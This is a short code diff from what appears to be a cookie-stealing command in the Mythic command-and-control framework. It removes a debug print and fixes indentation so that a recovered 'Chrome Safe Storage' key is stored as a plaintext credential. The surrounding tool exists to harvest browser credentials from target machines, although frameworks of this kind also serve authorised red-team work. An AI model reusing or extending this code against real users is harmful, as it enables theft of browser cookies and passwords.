@@ -123,17 +123,14 @@ class CookieThiefCommand(CommandBase):
             print("Failed to delete dumped keys directory with error: " + str(e))
             sys.stdout.flush()
 
-        ##DEBUG:
-        print(ccs_password)
-        sys.stdout.flush()
 
         cred = mythic_rest.Credential(type="plaintext",
                                       account="Chrome Safe Storage",
                                       credential=ccs_password,
                                       realm="local",
                                       comment="User Chrome Safe Storage Key")
-            ccs_resp = await mythic.create_credential(cred)
-            await mythic_rest.json_print(ccs_resp)
+        ccs_resp = await mythic.create_credential(cred)
+        await mythic_rest.json_print(ccs_resp)
 
 
 
